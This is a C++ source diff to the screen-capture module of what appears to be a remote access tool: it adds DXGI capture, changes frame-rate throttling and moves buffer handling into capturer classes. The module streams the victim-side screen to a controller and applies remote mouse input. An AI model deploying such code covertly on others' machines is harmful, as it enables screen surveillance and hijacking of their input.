@@ -14,6 +14,9 @@
 #include <time.h>
 using namespace std;
 
+#include "ScreenSpy.h"
+#include "ScreenCapturerDXGI.h"
+
 //////////////////////////////////////////////////////////////////////
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
@@ -21,14 +24,29 @@ using namespace std;
 #define WM_MOUSEWHEEL 0x020A
 #define GET_WHEEL_DELTA_WPARAM(wParam)((short)HIWORD(wParam))
 
-CScreenManager::CScreenManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
+bool IsWindows8orHigher() {
+	typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+	HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
+	if (!hMod) return false;
+
+	RtlGetVersionPtr rtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
+	if (!rtlGetVersion) return false;
+
+	RTL_OSVERSIONINFOW rovi = { 0 };
+	rovi.dwOSVersionInfoSize = sizeof(rovi);
+	if (rtlGetVersion(&rovi) == 0) {
+		return (rovi.dwMajorVersion > 6) || (rovi.dwMajorVersion == 6 && rovi.dwMinorVersion >= 2);
+	}
+	return false;
+}
+
+CScreenManager::CScreenManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
 {
 	m_bIsWorking = TRUE;
 	m_bIsBlockInput = FALSE;
 
-	m_ScreenSpyObject = new CScreenSpy(32);
-
-	szBuffer = new char[4 * m_ScreenSpyObject->GetWidth() * m_ScreenSpyObject->GetHeight() + 1];
+	bool DXGI = user;
+	m_ScreenSpyObject = (DXGI && IsWindows8orHigher()) ? (ScreenCapture*) new ScreenCapturerDXGI() : new CScreenSpy(32);
 
 	m_hWorkThread = CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)WorkThreadProc,this,0,NULL);
 }
@@ -55,9 +73,9 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 	const int sleep = 1000 / fps;// 间隔时间（ms）
 	int c1 = 0; // 连续耗时长的次数
 	int c2 = 0; // 连续耗时短的次数
-	int s0 = sleep; // 两帧之间隔（ms）
+	float s0 = sleep; // 两帧之间隔（ms）
 	const int frames = fps;	// 每秒调整屏幕发送速度
-	const double alpha = 1.2; // 控制fps的因子
+	const float alpha = 1.03; // 控制fps的因子
 	timeBeginPeriod(1);
 	while (This->m_bIsWorking)
 	{
@@ -65,6 +83,8 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 		const char*	szBuffer = This->GetNextScreen(ulNextSendLength);
 		if (szBuffer)
 		{
+			s0 = max(s0, 50); // 最快每秒20帧
+			s0 = min(s0, 1000);
 			int span = s0-(clock() - last);
 			Sleep(span > 0 ? span : 1);
 			if (span < 0) // 发送数据耗时较长，网络较差或数据较多
@@ -74,7 +94,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 					s0 = (s0 <= sleep*4) ? s0*alpha : s0;
 					c1 = 0;
 #ifdef _DEBUG
-					Mprintf("[+]SendScreen Span= %dms, s0= %d, fps= %f\n", span, s0, 1000./s0);
+					Mprintf("[+]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
 #endif
 				}
 			} else if (span > 0){ // 发送数据耗时比s0短，表示网络较好或数据包较小
@@ -83,7 +103,7 @@ DWORD WINAPI CScreenManager::WorkThreadProc(LPVOID lParam)
 					s0 = (s0 >= sleep/4) ? s0/alpha : s0;
 					c2 = 0;
 #ifdef _DEBUG
-					Mprintf("[-]SendScreen Span= %dms, s0= %d, fps= %f\n", span, s0, 1000./s0);
+					Mprintf("[-]SendScreen Span= %dms, s0= %f, fps= %f\n", span, s0, 1000./s0);
 #endif
 				}
 			}
@@ -126,11 +146,6 @@ CScreenManager::~CScreenManager()
 
 	delete m_ScreenSpyObject;
 	m_ScreenSpyObject = NULL;
-	if(szBuffer)
-	{
-		delete [] szBuffer;
-		szBuffer = NULL;
-	}
 }
 
 VOID CScreenManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
@@ -217,21 +232,14 @@ VOID CScreenManager::SendClientClipboard()
 
 VOID CScreenManager::SendFirstScreen()
 {
-	//类CScreenSpy的getFirstScreen函数中得到图像数据
-	//然后用getFirstImageSize得到数据的大小然后发送出去
-	LPVOID	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData();  
-	if (FirstScreenData == NULL)
+	ULONG ulFirstSendLength = 0;
+	LPVOID	FirstScreenData = m_ScreenSpyObject->GetFirstScreenData(&ulFirstSendLength);
+	if (ulFirstSendLength == 0 || FirstScreenData == NULL)
 	{
 		return;
 	}
 
-	ULONG	ulFirstSendLength = 1 + m_ScreenSpyObject->GetFirstScreenLength();
-
-	szBuffer[0] = TOKEN_FIRSTSCREEN;
-	memcpy(szBuffer + 1, FirstScreenData, ulFirstSendLength - 1);
-
-	m_ClientObject->OnServerSending((char*)szBuffer, ulFirstSendLength);
-	szBuffer[ulFirstSendLength-1] = 0;
+	m_ClientObject->OnServerSending((char*)FirstScreenData, ulFirstSendLength + 1);
 }
 
 const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
@@ -243,13 +251,7 @@ const char* CScreenManager::GetNextScreen(ULONG &ulNextSendLength)
 		return NULL;
 	}
 
-	ulNextSendLength += 1;
-
-	szBuffer[0] = TOKEN_NEXTSCREEN;
-	memcpy(szBuffer + 1, NextScreenData, ulNextSendLength - 1);
-	szBuffer[ulNextSendLength] = 0;
-
-	return szBuffer;
+	return (char*)NextScreenData;
 }
 
 VOID CScreenManager::SendNextScreen(const char* szBuffer, ULONG ulNextSendLength)
@@ -285,11 +287,7 @@ VOID CScreenManager::ProcessCommand(LPBYTE szBuffer, ULONG ulLength)
 				POINT Point;
 				Point.x = LOWORD(Msg->lParam);
 				Point.y = HIWORD(Msg->lParam);
-				if(m_ScreenSpyObject->IsZoomed())
-				{
-					Point.x *= m_ScreenSpyObject->GetWZoom();
-					Point.y *= m_ScreenSpyObject->GetHZoom();
-				}
+				m_ScreenSpyObject->PointConversion(Point);
 				SetCursorPos(Point.x, Point.y);
 				SetCapture(WindowFromPoint(Point));
 			}
